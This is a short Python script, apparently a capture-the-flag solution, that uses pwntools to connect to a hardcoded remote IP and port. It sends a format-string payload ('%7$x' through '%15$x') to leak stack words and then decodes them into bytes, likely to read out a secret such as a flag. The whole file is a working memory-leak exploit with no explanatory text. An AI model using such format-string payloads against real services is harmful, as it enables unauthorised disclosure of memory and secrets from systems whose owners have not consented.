from pwn import *

p = remote('159.65.13.76', 33105)

payload = '%7$x %8$x %9$x %10$x %11$x %12$x %13$x %14$x %15$x'

print p.recv()
p.sendline(payload)
a=''
listt = p.recv().split()[2:]
print listt
for i in listt:
    a+=p32(int(i, 16))
print a
